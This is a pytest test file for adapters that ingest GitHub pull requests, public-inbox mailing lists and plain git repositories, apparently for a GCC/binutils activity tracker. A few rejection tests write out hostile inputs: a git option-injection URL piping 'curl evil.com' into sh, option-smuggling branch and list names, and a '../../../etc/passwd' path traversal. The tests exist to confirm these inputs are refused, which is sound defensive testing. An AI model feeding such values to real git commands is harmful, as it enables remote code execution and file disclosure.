"""Tests for the source adapters.

Uses:
- respx  — mock httpx calls for GitHubAdapter
- unittest.mock — mock subprocess for PlainGitAdapter and PublicInboxAdapter
"""

from __future__ import annotations

import subprocess
from datetime import datetime, timezone
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest

from agents.adapters.github import GitHubAdapter
from agents.adapters.plain_git import PlainGitAdapter
from agents.ingestion.engine import IngestionEngine
from agents.models.raw import RawCommit, RawDiscussion


# ---------------------------------------------------------------------------
# GitHubAdapter
# ---------------------------------------------------------------------------

class TestGitHubAdapter:
    def _make_pr(self, number: int = 101) -> dict:
        return {
            "number": number,
            "title": f"gcc/ipa: inline improvement #{number}",
            "body": "Improve inliner.",
            "user": {"login": "dev"},
            "created_at": "2026-04-14T08:00:00Z",
            "updated_at": "2026-04-14T09:00:00Z",
            "html_url": f"https://github.com/gcc-mirror/gcc/pull/{number}",
            "state": "open",
            "draft": False,
            "labels": [],
            "changed_files": 3,
        }

    def _make_commit(self, sha: str = "abc123") -> dict:
        return {
            "sha": sha,
            "commit": {
                "message": "Fix inline heuristics",
                "author": {
                    "name": "Dev User",
                    "email": "dev@example.com",
                    "date": "2026-04-14T08:00:00Z",
                },
            },
            "html_url": f"https://github.com/gcc-mirror/gcc/commit/{sha}",
            "stats": {"additions": 10, "deletions": 3, "total": 13},
            "files": [{"filename": "gcc/ipa-inline.cc"}],
        }

    def test_fetch_discussions(self):
        try:
            import respx
        except ImportError:
            pytest.skip("respx not installed")

        pr = self._make_pr()
        # Create adapter INSIDE the mock context so the persistent client is mocked
        with respx.mock(base_url="https://api.github.com") as mock:
            adapter = GitHubAdapter("gcc-mirror", "gcc", token="fake-token")
            mock.get("/repos/gcc-mirror/gcc/pulls").respond(200, json=[pr])
            mock.get("/repos/gcc-mirror/gcc/pulls/101/comments").respond(200, json=[])
            mock.get("/repos/gcc-mirror/gcc/pulls/101").respond(
                200, text="diff --git a/gcc/ipa-inline.cc b/gcc/ipa-inline.cc\n"
            )

            discussions = adapter.fetch_discussions(since_hours=24)

        assert len(discussions) == 1
        d = discussions[0]
        assert isinstance(d, RawDiscussion)
        assert d.id == "101"
        assert d.source_type == "github_pr"
        assert "inline" in d.title.lower()

    def test_fetch_commits(self):
        try:
            import respx
        except ImportError:
            pytest.skip("respx not installed")

        commit = self._make_commit("deadbeef")
        with respx.mock(base_url="https://api.github.com") as mock:
            adapter = GitHubAdapter("gcc-mirror", "gcc", token="fake-token")
            mock.get("/repos/gcc-mirror/gcc/commits").respond(200, json=[commit])

            commits = adapter.fetch_commits(since_hours=24)

        assert len(commits) == 1
        c = commits[0]
        assert isinstance(c, RawCommit)
        assert c.sha == "deadbeef"
        assert c.source_type == "github"

    def test_http_error_on_comments_returns_empty_replies(self):
        try:
            import respx
        except ImportError:
            pytest.skip("respx not installed")

        pr = self._make_pr(200)
        with respx.mock(base_url="https://api.github.com") as mock:
            adapter = GitHubAdapter("gcc-mirror", "gcc", token="fake-token")
            mock.get("/repos/gcc-mirror/gcc/pulls").respond(200, json=[pr])
            mock.get("/repos/gcc-mirror/gcc/pulls/200/comments").respond(500, json={})
            mock.get("/repos/gcc-mirror/gcc/pulls/200").respond(200, text="")

            discussions = adapter.fetch_discussions(since_hours=24)

        assert discussions[0].replies == []

    def test_large_pr_diff_skipped(self):
        """PRs with >500 changed_files must not trigger a diff fetch."""
        try:
            import respx
        except ImportError:
            pytest.skip("respx not installed")

        pr = self._make_pr(300)
        pr["changed_files"] = 600  # exceeds threshold

        with respx.mock(base_url="https://api.github.com") as mock:
            adapter = GitHubAdapter("gcc-mirror", "gcc", token="fake-token")
            mock.get("/repos/gcc-mirror/gcc/pulls").respond(200, json=[pr])
            mock.get("/repos/gcc-mirror/gcc/pulls/300/comments").respond(200, json=[])
            # Diff endpoint should NOT be called — if it is, respx raises

            discussions = adapter.fetch_discussions(since_hours=24)

        assert discussions[0].diff_text is None


# ---------------------------------------------------------------------------
# PublicInboxAdapter
# ---------------------------------------------------------------------------

SAMPLE_MBOX = (
    b"From: Jane Doe <jane@example.com>\r\n"
    b"Message-ID: <patch-42@gcc.gnu.org>\r\n"
    b"Date: Mon, 14 Apr 2026 10:00:00 +0000\r\n"
    b"Subject: [PATCH] gcc/ipa: inline improvement\r\n"
    b"\r\n"
    b"This patch does something useful.\r\n"
    b"--- a/gcc/ipa.cc\r\n"
    b"+++ b/gcc/ipa.cc\r\n"
)


class TestPublicInboxAdapter:
    def test_parse_mbox_into_raw_discussion(self, tmp_path: Path):
        from agents.adapters.public_inbox import PublicInboxAdapter

        adapter = PublicInboxAdapter(
            discussion_lists=["gcc"],
            cvs_lists=[],
            cache_dir=tmp_path,
        )

        sha = "abc123def456"
        mock_mirror = tmp_path / "gcc.0.git"
        mock_mirror.mkdir()

        def fake_run(cmd, **kwargs):
            r = MagicMock()
            r.returncode = 0
            if "log" in cmd:
                r.stdout = f"{sha}\n"
            elif "show" in cmd:
                r.stdout = SAMPLE_MBOX
            else:
                r.stdout = b""
            return r

        # _mirror_list now returns list[Path] — mock returns a list
        with (
            patch("agents.adapters.public_inbox._mirror_list", return_value=[mock_mirror]),
            patch("agents.adapters.public_inbox.subprocess.run", side_effect=fake_run),
        ):
            discussions = adapter.fetch_discussions(since_hours=999)

        assert len(discussions) == 1
        d = discussions[0]
        assert d.source_type == "public_inbox"
        assert "inline" in d.title.lower()

    def test_all_epochs_iterated(self, tmp_path: Path):
        """Messages from epoch 1+ must appear in results, not just epoch 0."""
        from agents.adapters.public_inbox import PublicInboxAdapter

        adapter = PublicInboxAdapter(
            discussion_lists=["gcc"],
            cvs_lists=[],
            cache_dir=tmp_path,
        )

        sha0 = "a" * 40
        sha1 = "b" * 40
        epoch0 = tmp_path / "gcc.0.git"
        epoch1 = tmp_path / "gcc.1.git"
        epoch0.mkdir()
        epoch1.mkdir()

        # Each epoch must have a distinct Message-ID, otherwise the dedup
        # logic (seen_ids) correctly suppresses the duplicate.
        MBOX_EPOCH0 = SAMPLE_MBOX.replace(b"patch-42@gcc.gnu.org", b"patch-42@gcc.gnu.org")
        MBOX_EPOCH1 = SAMPLE_MBOX.replace(b"patch-42@gcc.gnu.org", b"patch-99@gcc.gnu.org")

        def fake_run(cmd, cwd=None, **kwargs):
            r = MagicMock()
            r.returncode = 0
            if "log" in cmd:
                r.stdout = f"{sha0}\n" if cwd == epoch0 else f"{sha1}\n"
            elif "show" in cmd:
                r.stdout = MBOX_EPOCH0 if cwd == epoch0 else MBOX_EPOCH1
            else:
                r.stdout = b""
            return r

        with (
            patch(
                "agents.adapters.public_inbox._mirror_list",
                return_value=[epoch0, epoch1],
            ),
            patch("agents.adapters.public_inbox.subprocess.run", side_effect=fake_run),
        ):
            discussions = adapter.fetch_discussions(since_hours=999)

        # Both epochs should contribute one distinct discussion each
        assert len(discussions) == 2
        ids = {d.id for d in discussions}
        assert "patch-42@gcc.gnu.org" in ids
        assert "patch-99@gcc.gnu.org" in ids

    def test_mirror_failure_returns_empty(self, tmp_path: Path):
        """When _mirror_list returns [], adapter must return [] without raising."""
        from agents.adapters.public_inbox import PublicInboxAdapter

        adapter = PublicInboxAdapter(
            discussion_lists=["gcc"],
            cvs_lists=[],
            cache_dir=tmp_path,
        )

        # _mirror_list returning [] simulates a total network failure
        with patch(
            "agents.adapters.public_inbox._mirror_list",
            return_value=[],
        ):
            result = adapter.fetch_discussions(since_hours=24)

        assert result == []

    def test_invalid_list_name_rejected(self, tmp_path: Path):
        """List names that could cause git-option injection must be rejected."""
        from agents.adapters.public_inbox import PublicInboxAdapter, _validate_list_name
        import pytest

        with pytest.raises(ValueError, match="Invalid list name"):
            _validate_list_name("--upload-pack=evil")

        with pytest.raises(ValueError, match="Invalid list name"):
            PublicInboxAdapter(
                discussion_lists=["../../../etc/passwd"],
                cvs_lists=[],
                cache_dir=tmp_path,
            )


# ---------------------------------------------------------------------------
# PlainGitAdapter
# ---------------------------------------------------------------------------

_GIT_LOG_LINE = (
    "deadbeef1234567890abcdef1234567890abcdef\x1f"
    "dev@example.com\x1f"
    "2026-04-14T09:00:00+00:00\x1f"
    "binutils/ld: fix relaxation loop\x1f"
    "HEAD -> master"
)


class TestPlainGitAdapter:
    def test_fetch_commits_parses_log(self, tmp_path: Path):
        adapter = PlainGitAdapter(
            repo_url="https://sourceware.org/git/binutils-gdb.git",
            branch="master",
            cache_dir=tmp_path,
        )
        bare = tmp_path / "binutils-gdb.git"
        bare.mkdir()

        def fake_run(cmd, cwd=None, **kwargs):
            if "clone" in cmd or "fetch" in cmd:
                return MagicMock(returncode=0, stdout="", stderr="")
            if "log" in cmd:
                return MagicMock(returncode=0, stdout=_GIT_LOG_LINE + "\n", stderr="")
            if "diff-tree" in cmd:
                return MagicMock(returncode=0, stdout="+45/-12\n", stderr="")
            return MagicMock(returncode=0, stdout="", stderr="")

        with patch("agents.adapters.plain_git.subprocess.run", side_effect=fake_run):
            commits = adapter.fetch_commits(since_hours=24)

        assert len(commits) == 1
        c = commits[0]
        assert c.sha == "deadbeef1234567890abcdef1234567890abcdef"
        assert c.source_type == "plain_git"
        assert "binutils" in c.message.lower()

    def test_git_log_failure_returns_empty(self, tmp_path: Path):
        adapter = PlainGitAdapter(
            repo_url="https://sourceware.org/git/binutils-gdb.git",
            cache_dir=tmp_path,
        )
        bare = tmp_path / "binutils-gdb.git"
        bare.mkdir()

        def fake_run(cmd, **kwargs):
            if "log" in cmd:
                raise subprocess.CalledProcessError(1, cmd)
            return MagicMock(returncode=0, stdout="", stderr="")

        with patch("agents.adapters.plain_git.subprocess.run", side_effect=fake_run):
            commits = adapter.fetch_commits(since_hours=24)

        assert commits == []

    def test_invalid_url_rejected(self, tmp_path: Path):
        """repo_url with disallowed scheme must raise ValueError immediately."""
        with pytest.raises(ValueError, match="Unsafe repo_url"):
            PlainGitAdapter(
                repo_url="--upload-pack=curl evil.com|sh",
                cache_dir=tmp_path,
            )

    def test_invalid_branch_rejected(self, tmp_path: Path):
        """Branch names that start with - or contain shell meta chars are rejected."""
        with pytest.raises(ValueError, match="Unsafe branch name"):
            PlainGitAdapter(
                repo_url="https://example.com/repo.git",
                branch="-c core.sshCommand=evil",
                cache_dir=tmp_path,
            )


# ---------------------------------------------------------------------------
# IngestionEngine — deduplication and fault isolation
# ---------------------------------------------------------------------------

class TestEngineDeduplication:
    def _make_discussion(self, id_: str) -> RawDiscussion:
        return RawDiscussion(
            id=id_,
            title=f"Discussion {id_}",
            body="body",
            author="a",
            date=datetime(2026, 4, 14, tzinfo=timezone.utc),
            url=f"https://example.com/{id_}",
            replies=[],
            diff_text=None,
            source_type="github_pr",
        )

    def _make_commit(self, sha: str) -> RawCommit:
        return RawCommit(
            sha=sha,
            author="a",
            date=datetime(2026, 4, 14, tzinfo=timezone.utc),
            message="msg",
            diff_stat="",
            url=f"https://example.com/{sha}",
            source_type="plain_git",
        )

    def test_duplicate_discussion_ids_deduplicated(self):
        class FakeDiscussionSource:
            def __init__(self, items):
                self._items = items

            def fetch_discussions(self, since_hours=24):
                return self._items

        d1 = self._make_discussion("42")
        d2 = self._make_discussion("42")  # same id, different object

        src1 = FakeDiscussionSource([d1])
        src2 = FakeDiscussionSource([d2])
        engine = IngestionEngine([src1, src2], [])
        result = engine.run()
        assert len(result["discussions"]) == 1

    def test_duplicate_commit_shas_deduplicated(self):
        class FakeCommitSource:
            def __init__(self, items):
                self._items = items

            def fetch_commits(self, since_hours=24):
                return self._items

        c1 = self._make_commit("cafebabe")
        c2 = self._make_commit("cafebabe")

        src1 = FakeCommitSource([c1])
        src2 = FakeCommitSource([c2])
        engine = IngestionEngine([], [src1, src2])
        result = engine.run()
        assert len(result["commits"]) == 1

    def test_adapter_exception_does_not_propagate(self):
        """Adapter errors must be caught by the engine — results are empty, not raises."""
        class BrokenSource:
            def fetch_discussions(self, since_hours=24):
                raise RuntimeError("adapter exploded")

            def fetch_commits(self, since_hours=24):
                raise RuntimeError("adapter exploded")

        engine = IngestionEngine([BrokenSource()], [BrokenSource()])
        result = engine.run()
        assert result["discussions"] == []
        assert result["commits"] == []
